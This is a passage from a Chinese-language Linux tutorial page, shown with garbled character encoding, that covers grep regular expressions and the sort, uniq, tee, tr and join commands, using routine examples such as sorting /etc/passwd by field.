<td>æ˜¾ç¤ºä¸åŒ…å«åŒ¹é…æ–‡æœ¬çš„æ‰€æœ‰è¡Œï¼ˆç›¸å½“äºæ±‚åï¼‰</td>
</tr>
<tr>
<td>-n</td>
<td>æ˜¾ç¤ºåŒ¹é…è¡ŒåŠè¡Œå·</td>
</tr>
<tr>
<td>-i</td>
<td>å¿½ç•¥å¤§å°å†™</td>
</tr>
<tr>
<td>-c</td>
<td>è®¡ç®—æ‰¾åˆ°çš„è¡Œæ•°</td>
</tr>
</tbody>
</table>
<p>grepæœç´¢å†…å®¹ä¸²å¯ä»¥æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼š</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>^a</td>
<td>è¡Œé¦–,æœå¯»ä»¥ m å¼€å¤´çš„è¡Œï¼›grep -n â€˜^aâ€™ 1.txt</td>
</tr>
<tr>
<td>ke$</td>
<td>è¡Œå°¾,æœå¯»ä»¥ ke ç»“æŸçš„è¡Œï¼›grep -n â€˜ke$â€™ 1.txt</td>
</tr>
<tr>
<td>[Ss]igna[Ll]</td>
<td>åŒ¹é… [] é‡Œä¸­ä¸€ç³»åˆ—å­—ç¬¦ä¸­çš„ä¸€ä¸ªï¼›æœå¯»åŒ¹é…å•è¯signalã€signaLã€Signalã€SignaLçš„è¡Œï¼›grep -n â€˜[Ss]igna[Ll]â€™ 1.txt</td>
</tr>
<tr>
<td>.</td>
<td>.åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„å­—ç¬¦ï¼›grep -n â€˜e.eâ€™ 1.txtå¯ä»¥åŒ¹é… eeeï¼Œeaeï¼Œeveï¼Œä½†æ˜¯ä¸åŒ¹é… eeï¼Œeaaeï¼›</td>
</tr>
<tr>
<td>*</td>
<td>åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå…ˆå‰å­—ç¬¦</td>
</tr>
<tr>
<td>[^]</td>
<td>åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦</td>
</tr>
<tr>
<td><code>\(..\)</code></td>
<td>æ ‡è®°åŒ¹é…å­—ç¬¦</td>
</tr>
<tr>
<td>\</td>
<td>é”šå®šå•è¯çš„å¼€å§‹</td>
</tr>
<tr>
<td><code>\&lt;</code></td>
<td>é”šå®šå•è¯çš„å¼€å¤´</td>
</tr>
<tr>
<td><code>\&gt;</code></td>
<td>é”šå®šå•è¯çš„ç»“æŸ</td>
</tr>
<tr>
<td><code>x\&#123;m\&#125;</code></td>
<td>é‡å¤å­—ç¬¦xï¼Œmæ¬¡</td>
</tr>
<tr>
<td><code>x\&#123;m,\&#125;</code></td>
<td>é‡å¤å­—ç¬¦x,è‡³å°‘mæ¬¡</td>
</tr>
<tr>
<td><code>x\&#123;m,n\&#125;</code></td>
<td>é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡</td>
</tr>
<tr>
<td>\w</td>
<td>åŒ¹é…æ–‡å­—å’Œæ•°å­—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯[A-Za-z0-9]</td>
</tr>
<tr>
<td>\b</td>
<td>å•è¯é”å®šç¬¦</td>
</tr>
</tbody>
</table>
<p>å®ä¾‹ï¼šæ˜¾ç¤ºæ‰€æœ‰ä»¥â€œhâ€ç»“å°¾çš„è¡Œ<br>
grep h$<br>
åŒ¹é…æ‰€æœ‰ä»¥â€œaâ€å¼€å¤´ä¸”ä»¥â€œeâ€ç»“å°¾çš„ï¼Œä¸­é—´åŒ…å«2ä¸ªå­—ç¬¦çš„å•è¯<br>
grep â€˜&lt;aâ€¦e&gt;â€™<br>
æ˜¾ç¤ºæ‰€æœ‰åŒ…å«ä¸€ä¸ªâ€yâ€æˆ–â€hâ€å­—ç¬¦çš„è¡Œ<br>
grep [yh]<br>
æ˜¾ç¤ºä¸åŒ…å«å­—æ¯a~k ä¸”åç´§è·Ÿâ€œppleâ€çš„å•è¯</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">grep [<span class="symbol">^a</span>-<span class="keyword">k</span>]pple</span><br></pre></td></tr></table></figure>
<p>ä»ç³»ç»Ÿè¯å…¸ä¸­é€‰æ‹©æ‰€æœ‰ä»¥â€œcâ€å¼€å¤´ä¸”ä»¥â€œoâ€ç»“å°¾çš„å•è¯<code>grep '\&lt;c.*o\&gt;'</code><br>
æ‰¾å‡ºä¸€ä¸ªæ–‡ä»¶ä¸­æˆ–è€…è¾“å‡ºä¸­æ‰¾åˆ°åŒ…å«<code>*</code>çš„è¡Œ<code>grep '\*'</code><br>
æ˜¾ç¤ºæ‰€æœ‰åŒ…å«æ¯ä¸ªå­—ç¬¦ä¸²è‡³å°‘æœ‰20ä¸ªè¿ç»­å­—æ¯çš„å•è¯çš„è¡Œ<br>
<code>grep [a-Z]\&#123;20,\&#125;</code></p>
<h4 id="sort-æ’åº">sort - æ’åº</h4>
<p><strong>è¯­æ³•ï¼š</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span> [-fbMnrtuk] [<span class="built_in">file</span> <span class="keyword">or</span> <span class="keyword">stdin</span>]</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-f ï¼šå¿½ç•¥å¤§å°å†™çš„å·®å¼‚ï¼Œä¾‹å¦‚ A ä¸ a è§†ä¸ºç¼–ç ç›¸åŒï¼›</p>
</li>
<li class="lvl-2">
<p>-b ï¼šå¿½ç•¥æœ€å‰é¢çš„ç©ºæ ¼ç¬¦éƒ¨åˆ†ï¼›</p>
</li>
<li class="lvl-2">
<p>-M ï¼šä»¥æœˆä»½çš„åå­—æ¥æ’åºï¼Œä¾‹å¦‚ JAN, DEC ç­‰ç­‰çš„æ’åºæ–¹æ³•ï¼›</p>
</li>
<li class="lvl-2">
<p>-n ï¼šä½¿ç”¨ã€çº¯æ•°å­—ã€è¿›è¡Œæ’åº(é»˜è®¤æ˜¯ä»¥æ–‡å­—å‹æ€æ¥æ’åºçš„)ï¼›</p>
</li>
<li class="lvl-2">
<p>-r ï¼šåå‘æ’åºï¼›</p>
</li>
<li class="lvl-2">
<p>-u ï¼šå°±æ˜¯ uniq ï¼Œç›¸åŒçš„æ•°æ®ä¸­ï¼Œä»…å‡ºç°ä¸€è¡Œä»£è¡¨ï¼›</p>
</li>
<li class="lvl-2">
<p>-t ï¼šåˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯ç”¨ [tab] é”®æ¥åˆ†éš”ï¼›</p>
</li>
<li class="lvl-2">
<p>-k ï¼šä»¥å“ªä¸ªåŒºé—´ (field) æ¥è¿›è¡Œæ’åº</p>
</li>
</ul>
<p>é»˜è®¤æ˜¯ä»¥ç¬¬ä¸€ä¸ªå­—ç¬¦å‡åºæ’åº:</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /etc/passwd | sort </span></span><br><span class="line"><span class="symbol">adm:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">4</span><span class="symbol">:adm</span><span class="symbol">:/var/adm</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line">avahi-<span class="symbol">autoipd:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">156</span><span class="symbol">:avahi-autoipd</span><span class="symbol">:/var/lib/avahi-autoipd</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">avahi:</span><span class="symbol">x:</span><span class="number">70</span><span class="symbol">:</span><span class="number">70</span><span class="symbol">:Avahi</span> <span class="symbol">daemon:</span>/<span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line">......</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>ä»¥ç¬¬3åˆ—æ’åºï¼š</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># cat /etc/passwd | sort -t &#x27;:&#x27; -k 3</span></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">14</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">operator:</span><span class="symbol">x:</span><span class="number">11</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:operator</span><span class="symbol">:/root</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">12</span><span class="symbol">:</span><span class="number">100</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨æ•°å­—æ’åºï¼š</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | sort -t <span class="string">&#x27;:&#x27;</span> -k <span class="number">3</span>n</span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<p>å€’åºæ’åºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">sort</span> -t <span class="string">&#x27;:&#x27;</span> -k 3nr</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">ntp:x:106:113::/home/ntp:/bin/false</span><br><span class="line">messagebus:x:105:109::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">sort</span> -t <span class="string">&#x27;:&#x27;</span> -k 3 -nr</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
<p>å…ˆä»¥ç¬¬å…­ä¸ªåŸŸçš„ç¬¬2ä¸ªå­—ç¬¦åˆ°ç¬¬4ä¸ªå­—ç¬¦è¿›è¡Œæ­£å‘æ’åºï¼Œå†åŸºäºç¬¬ä¸€ä¸ªåŸŸè¿›è¡Œåå‘æ’åºï¼š</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd |  sort -t <span class="string">&#x27;:&#x27;</span> -k <span class="number">6.2</span>,<span class="number">6.4</span> -k <span class="number">1</span>r      </span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/bin/sh</span></span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹/etc/passwdæœ‰å¤šå°‘ä¸ªshell:</p>
<p>æ–¹æ³•å¯¹/etc/passwdçš„ç¬¬ä¸ƒä¸ªåŸŸæ’åºå¹¶å»é‡ï¼Œç„¶åç»Ÿè®¡è¡Œæ•°ï¼š</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># cat /etc/passwd |  sort -t&#x27;:&#x27; -k 7 -u</span></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">syslog:</span><span class="symbol">x:</span><span class="number">996</span><span class="symbol">:</span><span class="number">994</span><span class="symbol">:</span><span class="symbol">:/home/syslog</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:sync</span><span class="symbol">:/sbin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">halt:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:halt</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/halt</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">shutdown:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:shutdown</span><span class="symbol">:/sbin</span><span class="symbol">:/sbin/shutdown</span></span><br><span class="line">[root<span class="variable">@VM_0_9_centos</span> ~]<span class="comment"># cat /etc/passwd |  sort -t&#x27;:&#x27; -k 7 -u|wc -l</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure>
<h4 id="uniq-å»é‡">uniq - å»é‡</h4>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">é€‰é¡¹ä¸å‚æ•°ï¼š</span><br><span class="line"><span class="deletion">-i   ï¼šå¿½ç•¥å¤§å°å†™å­—ç¬¦çš„ä¸åŒï¼›</span></span><br><span class="line"><span class="deletion">-c  ï¼šè¿›è¡Œè®¡æ•°</span></span><br><span class="line"><span class="deletion">-u  ï¼šåªæ˜¾ç¤ºå”¯ä¸€çš„è¡Œ</span></span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>è¯¥å‘½ä»¤ç”¨äºæ’å®Œåºä¹‹åï¼Œå¯¹æ’åºç»“æœè¿›è¡Œå»é‡</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span>@xxx:~$ last | cut -d <span class="string">&#x27; &#x27;</span> -f <span class="number">1</span>  | <span class="keyword">sort</span> | uniq</span><br><span class="line"></span><br><span class="line">haha</span><br><span class="line"><span class="keyword">python</span></span><br><span class="line">reboot</span><br><span class="line">wtmp</span><br><span class="line"><span class="keyword">python</span>@xxx:~$ last | cut -d <span class="string">&#x27; &#x27;</span> -f <span class="number">1</span>  | <span class="keyword">sort</span> | uniq -c</span><br><span class="line">      <span class="number">1</span> </span><br><span class="line">      <span class="number">2</span> haha</span><br><span class="line">     <span class="number">22</span> <span class="keyword">python</span></span><br><span class="line">      <span class="number">7</span> reboot</span><br><span class="line">      <span class="number">1</span> wtmp</span><br><span class="line"><span class="number">123456789101112</span></span><br></pre></td></tr></table></figure>
<p>æ’åºæ–‡ä»¶ï¼Œé»˜è®¤æ˜¯å»é‡ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> words | <span class="built_in">sort</span> |<span class="built_in">uniq</span></span></span><br><span class="line">friend</span><br><span class="line">hello</span><br><span class="line">world</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>æ’åºä¹‹ååˆ é™¤äº†é‡å¤è¡Œï¼ŒåŒæ—¶åœ¨è¡Œé¦–ä½ç½®è¾“å‡ºè¯¥è¡Œé‡å¤çš„æ¬¡æ•°ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sort</span> testfile | <span class="built_in">uniq</span> -c</span></span><br><span class="line">1 friend</span><br><span class="line">3 hello</span><br><span class="line">2 world</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>ä»…æ˜¾ç¤ºå­˜åœ¨é‡å¤çš„è¡Œï¼Œå¹¶åœ¨è¡Œé¦–æ˜¾ç¤ºè¯¥è¡Œé‡å¤çš„æ¬¡æ•°ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sort</span> testfile | <span class="built_in">uniq</span> -dc</span></span><br><span class="line">3 hello</span><br><span class="line">2 world</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p>ä»…æ˜¾ç¤ºä¸é‡å¤çš„è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span> testfile | <span class="built_in">uniq</span> -u</span><br><span class="line">friend</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<h4 id="tee-åŒæ—¶è¾“å‡ºå¤šä¸ªæ–‡ä»¶">tee - åŒæ—¶è¾“å‡ºå¤šä¸ªæ–‡ä»¶</h4>
<p>ä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æ•°æ®ï¼Œå°†å…¶å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼ŒåŒæ—¶ä¿å­˜æˆæ–‡ä»¶ã€‚</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹ç”¨é‡å®šå‘å®ç°ï¼Œéœ€è¦åŒæ—¶è¾“å‡ºå¤šä¸ªæ–‡ä»¶æ—¶å¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤ã€‚</p>
<p><strong>å‚æ•°</strong>ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-aæˆ–â€“append ã€€é™„åŠ åˆ°æ—¢æœ‰æ–‡ä»¶çš„åé¢ï¼Œè€Œéè¦†ç›–å®ƒï¼</p>
</li>
</ul>
<p>å°†è¾“å‡ºåŒæ—¶ä¿å­˜åˆ°å¤šä¸ªæ–‡ä»¶ä¸­ï¼ŒåŒæ—¶å°†è¾“å‡ºå†…å®¹æ˜¾ç¤ºåˆ°æ§åˆ¶å°ï¼š</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>echo <span class="string">&quot;hello world&quot;</span>|tee f1 f2 </span><br><span class="line">hello world</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat f1</span><br><span class="line">hello world</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>echo <span class="string">&quot;hello world&quot;</span>|tee f1 f2 -a</span><br><span class="line">hello world</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat f1</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure>
<h4 id="tr-æ›¿æ¢æŒ‡å®šçš„å­—ç¬¦">tr - æ›¿æ¢æŒ‡å®šçš„å­—ç¬¦</h4>
<p>ä¸æŒ‡å®šå‚æ•°æ—¶ï¼Œå³è¡¨ç¤ºæ›¿æ¢æŒ‡å®šçš„å­—ç¬¦ä¸ºå¦ä¸€ä¸ªå­—ç¬¦ï¼Œæ”¯æŒæŒ‡å®šçš„å­—ç¬¦é›†åˆã€‚</p>
<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-d, --deleteï¼šåˆ é™¤æŒ‡å®šçš„å­—ç¬¦</p>
</li>
<li class="lvl-2">
<p>-s, --squeeze-repeatsï¼šç¼©å‡è¿ç»­é‡å¤çš„å­—ç¬¦æˆæŒ‡å®šçš„å•ä¸ªå­—ç¬¦</p>
</li>
</ul>
<p>å­—ç¬¦é›†åˆçš„èŒƒå›´ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>\NNN å…«è¿›åˆ¶å€¼çš„å­—ç¬¦ NNN (1 to 3 ä¸ºå…«è¿›åˆ¶å€¼çš„å­—ç¬¦)</p>
</li>
<li class="lvl-2">
<p>\ åæ–œæ </p>
</li>
<li class="lvl-2">
<p>\a Ctrl-G é“ƒå£°</p>
</li>
<li class="lvl-2">
<p>\b Ctrl-H é€€æ ¼ç¬¦</p>
</li>
<li class="lvl-2">
<p>\f Ctrl-L èµ°è¡Œæ¢é¡µ</p>
</li>
<li class="lvl-2">
<p>\n Ctrl-J æ–°è¡Œ</p>
</li>
<li class="lvl-2">
<p>\r Ctrl-M å›è½¦</p>
</li>
<li class="lvl-2">
<p>\t Ctrl-I tabé”®</p>
</li>
<li class="lvl-2">
<p>\v Ctrl-X æ°´å¹³åˆ¶è¡¨ç¬¦</p>
</li>
<li class="lvl-2">
<p>CHAR1-CHAR2 ï¼šå­—ç¬¦èŒƒå›´ä» CHAR1 åˆ° CHAR2 çš„æŒ‡å®šï¼ŒèŒƒå›´çš„æŒ‡å®šä»¥ ASCII ç çš„æ¬¡åºä¸ºåŸºç¡€ï¼Œåªèƒ½ç”±å°åˆ°å¤§ï¼Œä¸èƒ½ç”±å¤§åˆ°å°ã€‚</p>
</li>
<li class="lvl-2">
<p>[CHAR*] ï¼šè¿™æ˜¯ SET2 ä¸“ç”¨çš„è®¾å®šï¼ŒåŠŸèƒ½æ˜¯é‡å¤æŒ‡å®šçš„å­—ç¬¦åˆ°ä¸ SET1 ç›¸åŒé•¿åº¦ä¸ºæ­¢</p>
</li>
<li class="lvl-2">
<p>[CHAR*REPEAT] ï¼šè¿™ä¹Ÿæ˜¯ SET2 ä¸“ç”¨çš„è®¾å®šï¼ŒåŠŸèƒ½æ˜¯é‡å¤æŒ‡å®šçš„å­—ç¬¦åˆ°è®¾å®šçš„ REPEAT æ¬¡æ•°ä¸ºæ­¢(REPEAT çš„æ•°å­—é‡‡ 8 è¿›ä½åˆ¶è®¡ç®—ï¼Œä»¥ 0 ä¸ºå¼€å§‹)</p>
</li>
<li class="lvl-2">
<p>[:alnum:] ï¼šæ‰€æœ‰å­—æ¯å­—ç¬¦ä¸æ•°å­—</p>
</li>
<li class="lvl-2">
<p>[:alpha:] ï¼šæ‰€æœ‰å­—æ¯å­—ç¬¦</p>
</li>
<li class="lvl-2">
<p>[:blank:] ï¼šæ‰€æœ‰æ°´å¹³ç©ºæ ¼</p>
</li>
<li class="lvl-2">
<p>[:cntrl:] ï¼šæ‰€æœ‰æ§åˆ¶å­—ç¬¦</p>
</li>
<li class="lvl-2">
<p>[:digit:] ï¼šæ‰€æœ‰æ•°å­—</p>
</li>
<li class="lvl-2">
<p>[:graph:] ï¼šæ‰€æœ‰å¯æ‰“å°çš„å­—ç¬¦(ä¸åŒ…å«ç©ºæ ¼ç¬¦)</p>
</li>
<li class="lvl-2">
<p>[:lower:] ï¼šæ‰€æœ‰å°å†™å­—æ¯</p>
</li>
<li class="lvl-2">
<p>[:print:] ï¼šæ‰€æœ‰å¯æ‰“å°çš„å­—ç¬¦(åŒ…å«ç©ºæ ¼ç¬¦)</p>
</li>
<li class="lvl-2">
<p>[:punct:] ï¼šæ‰€æœ‰æ ‡ç‚¹å­—ç¬¦</p>
</li>
<li class="lvl-2">
<p>[:space:] ï¼šæ‰€æœ‰æ°´å¹³ä¸å‚ç›´ç©ºæ ¼ç¬¦</p>
</li>
<li class="lvl-2">
<p>[:upper:] ï¼šæ‰€æœ‰å¤§å†™å­—æ¯</p>
</li>
<li class="lvl-2">
<p>[:xdigit:] ï¼šæ‰€æœ‰ 16 è¿›ä½åˆ¶çš„æ•°å­—</p>
</li>
<li class="lvl-2">
<p>[=CHAR=] ï¼šæ‰€æœ‰ç¬¦åˆæŒ‡å®šçš„å­—ç¬¦(ç­‰å·é‡Œçš„ CHARï¼Œä»£è¡¨ä½ å¯è‡ªè®¢çš„å­—ç¬¦)</p>
</li>
</ul>
<p>å°†æ–‡ä»¶testfileä¸­çš„å°å†™å­—æ¯å…¨éƒ¨è½¬æ¢æˆå¤§å†™å­—æ¯ï¼š</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">cat</span> <span class="selector-tag">testfile</span> |<span class="selector-tag">tr</span> <span class="selector-tag">a</span><span class="selector-tag">-z</span> <span class="selector-tag">A</span><span class="selector-tag">-Z</span> </span><br><span class="line">æˆ–</span><br><span class="line"><span class="selector-tag">cat</span> <span class="selector-tag">testfile</span> |<span class="selector-tag">tr</span> <span class="selector-attr">[:lower:]</span> <span class="selector-attr">[:upper:]</span> </span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
<p>ç¼©å‡è¿ç»­é‡å¤çš„å­—ç¬¦æˆæŒ‡å®šçš„å•ä¸ªå­—ç¬¦ï¼š</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t</span><br><span class="line">dddddddsssssdd</span><br><span class="line">eeeeeeeeee</span><br><span class="line">aaaaaaaaaaaaaa</span><br><span class="line">vvvvvvvvvvvvvv</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t|tr -s <span class="string">&#x27;se&#x27;</span></span><br><span class="line">dddddddsdd</span><br><span class="line">e</span><br><span class="line">aaaaaaaaaaaaaa</span><br><span class="line">vvvvvvvvvvvvvv</span><br><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t|tr -s <span class="string">&#x27;sdeav&#x27;</span></span><br><span class="line">dsd</span><br><span class="line">e</span><br><span class="line">a</span><br><span class="line">v</span><br><span class="line"><span class="number">123456789101112131415</span></span><br></pre></td></tr></table></figure>
<p>åˆ é™¤æŒ‡å®šçš„å­—ç¬¦ï¼š</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@xxx</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat t|tr -d <span class="string">&#x27;dv&#x27;</span></span><br><span class="line">sssss</span><br><span class="line">eeeeeeeeee</span><br><span class="line">aaaaaaaaaaaaaa</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h4 id="join-æ–‡ä»¶æŒ‰è¡Œè¿æ¥">join - æ–‡ä»¶æŒ‰è¡Œè¿æ¥</h4>
<p>å°†ä¸¤ä¸ªæ–‡ä»¶ä¸­æŒ‡å®šæ ä½ç›¸åŒçš„è¡Œè¿æ¥èµ·æ¥ã€‚å³æŒ‰ç…§ä¸¤ä¸ªæ–‡ä»¶ä¸­å…±åŒæ‹¥æœ‰çš„æŸä¸€åˆ—ï¼Œå°†å¯¹åº”çš„è¡Œæ‹¼æ¥æˆä¸€è¡Œã€‚</p>
<p>æ³¨æ„ï¼šåœ¨ä½¿ç”¨joinä¹‹å‰æ‰€å¤„ç†çš„æ–‡ä»¶è¦äº‹å…ˆç»è¿‡æ’åºã€‚</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">$ cat testfile_1</span><br><span class="line">Hello 95 #ä¾‹å¦‚ï¼Œæœ¬ä¾‹ä¸­ç¬¬ä¸€åˆ—ä¸ºå§“åï¼Œç¬¬äºŒåˆ—ä¸ºæ•°é¢  </span><br><span class="line">Linux 85  </span><br><span class="line"><span class="keyword">test </span>30  </span><br><span class="line">cmd@hdd-desktop:~$ cat testfile_2</span><br><span class="line">Hello 2005 #ä¾‹å¦‚ï¼Œæœ¬ä¾‹ä¸­ç¬¬ä¸€åˆ—ä¸ºå§“åï¼Œç¬¬äºŒåˆ—ä¸ºå¹´ä»½  </span><br><span class="line">Linux 2009  </span><br><span class="line"><span class="keyword">test </span>2006 </span><br><span class="line">12345678</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨joinå‘½ä»¤ï¼Œå°†ä¸¤ä¸ªæ–‡ä»¶è¿æ¥ï¼š</p>
